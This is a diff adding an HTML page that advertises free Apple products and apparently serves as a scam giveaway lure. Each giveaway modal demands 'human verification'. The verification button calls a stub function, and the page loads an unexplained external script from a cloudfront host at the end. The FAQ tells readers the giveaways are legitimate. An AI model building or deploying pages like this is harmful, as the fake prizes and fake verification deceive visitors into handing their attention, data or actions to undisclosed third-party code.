@@ -1,0 +1,522 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exclusive Apple Giveaways - Win an iPhone 14, Apple Watch & More!</title>
+    <meta name="description" content="Enter our exclusive giveaways for a chance to win the latest Apple products like the iPhone 14 Pro, Apple Watch Ultra, and AirPods Pro. Join for free today!">
+    <meta name="keywords" content="apple giveaway, iphone giveaway, win iphone 14, free iphone, apple watch giveaway, airpods pro giveaway, tech giveaways">
+    <meta name="author" content="Exclusive Giveaways">
+    <link rel="canonical" href="https://giveawayloop.netlify.app/">
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-749EVJH0PG"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-749EVJH0PG');
+    </script>
+
+    <style>
+        /* General Styles */
+        :root {
+            --primary-color: #22C55E;
+            --primary-hover-color: #16A34A;
+            --background-color: #F0FDF4;
+            --card-background-color: #DCFCE7;
+            --text-color: #1F2937;
+            --light-text-color: #4B5563;
+            --border-radius: 16px;
+            --shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Inter', Arial, sans-serif;
+            background-color: #FFFFFF;
+            color: var(--text-color);
+            line-height: 1.6;
+        }
+
+        /* Layout & Container */
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        /* Header */
+        header {
+            text-align: center;
+            padding: 40px 20px;
+        }
+
+        .logo img {
+            max-width: 180px;
+            height: auto;
+            margin-bottom: 1rem;
+        }
+        
+        h1 {
+            font-size: 2.5rem;
+            font-weight: 700;
+            margin-bottom: 0.5rem;
+        }
+
+        header p {
+            font-size: 1.1rem;
+            color: var(--light-text-color);
+        }
+
+        /* Giveaway Grid */
+        .giveaway-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 2rem;
+            margin-top: 2rem;
+        }
+
+        .card {
+            background-color: var(--card-background-color);
+            border-radius: var(--border-radius);
+            box-shadow: var(--shadow);
+            padding: 24px;
+            text-align: center;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.12);
+        }
+
+        .card img {
+            max-width: 100%;
+            height: 200px;
+            object-fit: contain;
+            border-radius: 10px;
+            margin-bottom: 1rem;
+        }
+
+        .card h2 {
+            font-size: 1.5rem;
+            font-weight: 600;
+            margin-bottom: 0.5rem;
+        }
+
+        .card .details {
+            font-size: 1rem;
+            color: var(--light-text-color);
+            min-height: 50px;
+            margin-bottom: 1.5rem;
+        }
+
+        .card .cta-button {
+            background-color: var(--primary-color);
+            color: #fff;
+            border: none;
+            border-radius: 10px;
+            font-size: 1rem;
+            font-weight: 600;
+            padding: 12px;
+            width: 100%;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .card .cta-button:hover {
+            background-color: var(--primary-hover-color);
+        }
+        
+        /* Content Section */
+        .content-section {
+            background-color: var(--background-color);
+            padding: 60px 20px;
+            margin-top: 4rem;
+            border-radius: var(--border-radius);
+        }
+
+        .content-section h2 {
+            text-align: center;
+            font-size: 2rem;
+            margin-bottom: 2rem;
+        }
+        
+        .content-section p, .content-section ul li {
+            text-align: justify;
+            color: var(--light-text-color);
+            margin-bottom: 1rem;
+        }
+        
+        .content-section strong {
+            color: var(--text-color);
+        }
+
+        /* Footer */
+        footer {
+            text-align: center;
+            padding: 40px 20px;
+            margin-top: 2rem;
+            border-top: 1px solid #E5E7EB;
+        }
+        
+        footer a {
+            color: var(--light-text-color);
+            text-decoration: none;
+            margin: 0 15px;
+            transition: color 0.3s ease;
+        }
+        
+        footer a:hover {
+            color: var(--primary-color);
+        }
+        
+        footer .copyright {
+            margin-top: 1rem;
+            font-size: 0.9rem;
+            color: #9CA3AF;
+        }
+        
+        /* Modal Styles */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            overflow: auto;
+            background-color: rgba(0, 0, 0, 0.6);
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal-content {
+            background-color: #fefefe;
+            margin: auto;
+            padding: 30px;
+            border-radius: var(--border-radius);
+            width: 90%;
+            max-width: 500px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+            text-align: center;
+            position: relative;
+            animation: fadeIn 0.3s;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.95); }
+            to { opacity: 1; transform: scale(1); }
+        }
+
+        .close-button {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            font-size: 28px;
+            font-weight: bold;
+            color: #aaa;
+            cursor: pointer;
+            transition: color 0.3s ease;
+        }
+
+        .close-button:hover,
+        .close-button:focus {
+            color: #000;
+        }
+
+        .modal-content h2 {
+            margin-bottom: 1rem;
+        }
+
+        .modal-content img {
+            max-width: 250px;
+            margin-bottom: 1rem;
+        }
+        
+        .modal-description p {
+            margin-bottom: 1.5rem;
+            line-height: 1.5;
+        }
+        
+        .modal-description strong {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 1.1rem;
+        }
+        
+        .verification-notice {
+            background-color: #FEF3C7;
+            color: #92400E;
+            padding: 12px;
+            border-radius: 8px;
+            margin: 1.5rem 0;
+        }
+        
+        .modal-button {
+             background-color: var(--primary-color);
+            color: #fff;
+            border: none;
+            border-radius: 10px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            padding: 14px;
+            width: 100%;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        
+        .modal-button:hover {
+            background-color: var(--primary-hover-color);
+        }
+        
+        /* Responsive Design */
+        @media screen and (max-width: 768px) {
+            h1 { font-size: 2rem; }
+            .modal-content { width: 95%; padding: 20px; }
+        }
+    </style>
+</head>
+
+<body>
+
+    <header>
+        <div class="logo">
+            <img src="https://i.imgur.com/sfZ0jY0.png" alt="Exclusive Giveaways Logo">
+        </div>
+        <h1>Exclusive Giveaways</h1>
+        <p>Your chance to win the latest and greatest tech, completely free!</p>
+    </header>
+
+    <main class="container">
+        <section id="giveaways">
+            <div class="giveaway-grid">
+                <article class="card">
+                    <img src="https://i.imgur.com/C7gXZJl.png" alt="Deep Purple iPhone 14 Pro">
+                    <h2>iPhone 14 Pro</h2>
+                    <p class="details">Deep Purple - 512 GB<br>6.1-inch display</p>
+                    <button class="cta-button" onclick="openModal('modal-iphone14pro')">Join Giveaway</button>
+                </article>
+
+                <article class="card">
+                    <img src="https://i.imgur.com/R7s5bt6.png" alt="Space Black iPhone 14 Pro Max">
+                    <h2>iPhone 14 Pro Max</h2>
+                    <p class="details">Space Black - 1TB<br>6.7-inch display</p>
+                    <button class="cta-button" onclick="openModal('modal-iphone14promax')">Join Giveaway</button>
+                </article>
+
+                <article class="card">
+                    <img src="https://i.imgur.com/5GAPKHs.png" alt="Blue iPhone 14 Plus">
+                    <h2>iPhone 14 Plus</h2>
+                    <p class="details">Blue - 512GB<br>6.7-inch display</p>
+                    <button class="cta-button" onclick="openModal('modal-iphone14plus')">Join Giveaway</button>
+                </article>
+
+                <article class="card">
+                    <img src="https://i.imgur.com/arF7FEY.png" alt="Apple AirPods Pro 2nd generation">
+                    <h2>AirPods Pro</h2>
+                    <p class="details">2nd Generation<br>Active Noise Cancellation</p>
+                    <button class="cta-button" onclick="openModal('modal-airpodspro')">Join Giveaway</button>
+                </article>
+
+                <article class="card">
+                    <img src="https://i.imgur.com/E4z8Vpf.png" alt="Apple Watch Ultra with Orange band">
+                    <h2>Apple Watch Ultra</h2>
+                    <p class="details">Orange Alpine Loop - 49mm<br>Titanium Case</p>
+                    <button class="cta-button" onclick="openModal('modal-watchultra')">Join Giveaway</button>
+                </article>
+
+                <article class="card">
+                    <img src="https://i.imgur.com/wtSDuwG.png" alt="Apple Watch Series 8 in Aluminum">
+                    <h2>Apple Watch Series 8</h2>
+                    <p class="details">Midnight Aluminum - 45mm<br>GPS + Cellular</p>
+                    <button class="cta-button" onclick="openModal('modal-watch8')">Join Giveaway</button>
+                </article>
+            </div>
+        </section>
+
+        <section id="how-to-win" class="content-section">
+            <h2>Maximizing Your Chances to Win</h2>
+            <p>The iPhone continues to be a symbol of innovation. With every new model, excitement builds, and so do the opportunities to win one. These giveaways are promotional campaigns designed to create buzz and reward loyal followers. Here’s how you can strategically increase your chances of winning an iPhone or other great Apple products.</p>
+            
+            <h3>Tips for Success:</h3>
+            <ul>
+                <li><strong>Read the Rules Carefully:</strong> Always understand the entry requirements. Missing a step can lead to disqualification.</li>
+                <li><strong>Enter Consistently:</strong> Look for giveaways that allow daily or multiple entries and participate as often as permitted.</li>
+                <li><strong>Be Creative:</strong> If a giveaway requires a creative submission like a photo or video, put in the effort to make your entry unique and compelling.</li>
+                <li><strong>Stay Organized:</strong> Keep track of the giveaways you've entered, noting deadlines and requirements to ensure you don't miss any announcements.</li>
+                <li><strong>Be Patient & Persistent:</strong> Winning requires a bit of luck and persistence. Don't be discouraged if you don't win immediately.</li>
+            </ul>
+        </section>
+
+        <section id="faq" class="content-section" style="background-color: #fff;">
+            <h2>Frequently Asked Questions (FAQs)</h2>
+            
+            <h3>Are these Apple iPhone giveaways legitimate?</h3>
+            <p>Yes, many giveaways are legitimate promotions run by reputable companies. However, it's crucial to be cautious. We advise you to never provide sensitive personal information like bank details. Legitimate giveaways will not ask for this.</p>
+
+            <h3>How can I find trustworthy giveaways?</h3>
+            <p>Trustworthy giveaways are often found on official social media pages of major brands, tech blogs, and mobile carriers. Always check the legitimacy of the organizer before participating.</p>
+            
+            <h3>Can I really improve my chances of winning?</h3>
+            <p>Absolutely. By following the tips outlined above—such as carefully following the rules, being creative, and staying organized—you can significantly increase your odds of winning.</p>
+        </section>
+    </main>
+
+    <footer id="footer">
+        <div class="container">
+            <p>
+                <a href="#privacy-policy" onclick="openModal('modal-privacy')">Privacy Policy</a> |
+                <a href="#contact-us" onclick="openModal('modal-contact')">Contact Us</a>
+            </p>
+            <p class="copyright">
+                All Rights Reserved &copy; 2023 - 2025 Exclusive Giveaways
+            </p>
+        </div>
+    </footer>
+    
+    <div id="modal-iphone14pro" class="modal">
+        <div class="modal-content">
+            <span class="close-button" onclick="closeModal('modal-iphone14pro')">&times;</span>
+            <h2>iPhone 14 Pro Giveaway</h2>
+            <img src="https://i.imgur.com/C7gXZJl.png" alt="iPhone 14 Pro">
+            <div class="modal-description">
+                <p><strong>Details:</strong><br>Deep Purple - 512GB<br>6.1-inch display<br>Worldwide Shipping (7-14 days est.)</p>
+                <div class="verification-notice"><strong>Human Verification Required</strong><br>To prevent abuse and ensure fair participation, please complete the verification step.</div>
+                <button class="modal-button" onclick="_GK()">Verify to Join</button>
+            </div>
+        </div>
+    </div>
+    
+    <div id="modal-iphone14promax" class="modal">
+        <div class="modal-content">
+            <span class="close-button" onclick="closeModal('modal-iphone14promax')">&times;</span>
+            <h2>iPhone 14 Pro Max Giveaway</h2>
+            <img src="https://i.imgur.com/R7s5bt6.png" alt="iPhone 14 Pro Max">
+            <div class="modal-description">
+                <p><strong>Details:</strong><br>Space Black - 1TB<br>6.7-inch display<br>Worldwide Shipping (7-14 days est.)</p>
+                <div class="verification-notice"><strong>Human Verification Required</strong><br>To prevent abuse and ensure fair participation, please complete the verification step.</div>
+                <button class="modal-button" onclick="_GK()">Verify to Join</button>
+            </div>
+        </div>
+    </div>
+    <div id="modal-iphone14plus" class="modal">
+        <div class="modal-content">
+            <span class="close-button" onclick="closeModal('modal-iphone14plus')">&times;</span>
+            <h2>iPhone 14 Plus Giveaway</h2>
+            <img src="https://i.imgur.com/5GAPKHs.png" alt="iPhone 14 Plus">
+            <div class="modal-description">
+                <p><strong>Details:</strong><br>Blue - 512GB<br>6.7-inch display<br>Worldwide Shipping (7-14 days est.)</p>
+                <div class="verification-notice"><strong>Human Verification Required</strong><br>To prevent abuse and ensure fair participation, please complete the verification step.</div>
+                <button class="modal-button" onclick="_GK()">Verify to Join</button>
+            </div>
+        </div>
+    </div>
+    <div id="modal-airpodspro" class="modal">
+        <div class="modal-content">
+            <span class="close-button" onclick="closeModal('modal-airpodspro')">&times;</span>
+            <h2>AirPods Pro Giveaway</h2>
+            <img src="https://i.imgur.com/arF7FEY.png" alt="AirPods Pro">
+            <div class="modal-description">
+                <p><strong>Details:</strong><br>2nd Generation<br>Worldwide Shipping (7-14 days est.)</p>
+                <div class="verification-notice"><strong>Human Verification Required</strong><br>To prevent abuse and ensure fair participation, please complete the verification step.</div>
+                <button class="modal-button" onclick="_GK()">Verify to Join</button>
+            </div>
+        </div>
+    </div>
+    <div id="modal-watchultra" class="modal">
+        <div class="modal-content">
+            <span class="close-button" onclick="closeModal('modal-watchultra')">&times;</span>
+            <h2>Apple Watch Ultra Giveaway</h2>
+            <img src="https://i.imgur.com/E4z8Vpf.png" alt="Apple Watch Ultra">
+            <div class="modal-description">
+                <p><strong>Details:</strong><br>Orange - 49mm<br>Titanium Case<br>Worldwide Shipping (7-14 days est.)</p>
+                <div class="verification-notice"><strong>Human Verification Required</strong><br>To prevent abuse and ensure fair participation, please complete the verification step.</div>
+                <button class="modal-button" onclick="_GK()">Verify to Join</button>
+            </div>
+        </div>
+    </div>
+    <div id="modal-watch8" class="modal">
+        <div class="modal-content">
+            <span class="close-button" onclick="closeModal('modal-watch8')">&times;</span>
+            <h2>Apple Watch Series 8 Giveaway</h2>
+            <img src="https://i.imgur.com/wtSDuwG.png" alt="Apple Watch Series 8">
+            <div class="modal-description">
+                <p><strong>Details:</strong><br>Series 8 - 45mm<br>Aluminium<br>Worldwide Shipping (7-14 days est.)</p>
+                <div class="verification-notice"><strong>Human Verification Required</strong><br>To prevent abuse and ensure fair participation, please complete the verification step.</div>
+                <button class="modal-button" onclick="_GK()">Verify to Join</button>
+            </div>
+        </div>
+    </div>
+    
+    <div id="modal-privacy" class="modal">
+        <div class="modal-content" style="text-align: left;">
+            <span class="close-button" onclick="closeModal('modal-privacy')">&times;</span>
+            <h2>Privacy Policy</h2>
+            <p>At Exclusive Giveaways, we value your privacy. This policy explains how we collect and use your data when you participate in our giveaways.</p>
+            <p><strong>Data Collection:</strong> We may collect your name and email address for giveaway entries and communication. We do not share this information with third parties unless required to fulfill a prize.</p>
+            <p><strong>Security:</strong> We take reasonable measures to protect your information from unauthorized access.</p>
+            <p><strong>Cookies:</strong> We may use cookies to improve your experience on our site. You can control cookies through your browser settings.</p>
+            <p>This policy is effective as of January 01, 2023.</p>
+        </div>
+    </div>
+
+    <div id="modal-contact" class="modal">
+        <div class="modal-content">
+            <span class="close-button" onclick="closeModal('modal-contact')">&times;</span>
+            <h2>Contact Us</h2>
+            <p>If you have any questions, please feel free to reach out to us.</p>
+            <p><strong>Email:</strong> marsgiveaway6@gmail.com</p>
+            <p>We will do our best to respond as soon as possible.</p>
+        </div>
+    </div>
+    
+
+    <script>
+        // --- Modal Functionality ---
+        function openModal(modalId) {
+            const modal = document.getElementById(modalId);
+            if (modal) {
+                modal.style.display = 'flex';
+            }
+        }
+
+        function closeModal(modalId) {
+            const modal = document.getElementById(modalId);
+            if (modal) {
+                modal.style.display = 'none';
+            }
+        }
+
+        // Close modal if user clicks outside of the modal content
+        window.onclick = function(event) {
+            const modals = document.getElementsByClassName('modal');
+            for (let i = 0; i < modals.length; i++) {
+                if (event.target == modals[i]) {
+                    modals[i].style.display = 'none';
+                }
+            }
+        }
+
+        // Placeholder for external verification script function
+        function _GK() {
+            alert("Redirecting to verification step...");
+            // In a real scenario, this would trigger a third-party verification service.
+        }
+    </script>
+    
+    <script src="https://d2v7l2267atlz5.cloudfront.net/bdc29cc.js"></script>
+
+</body>
+</html>
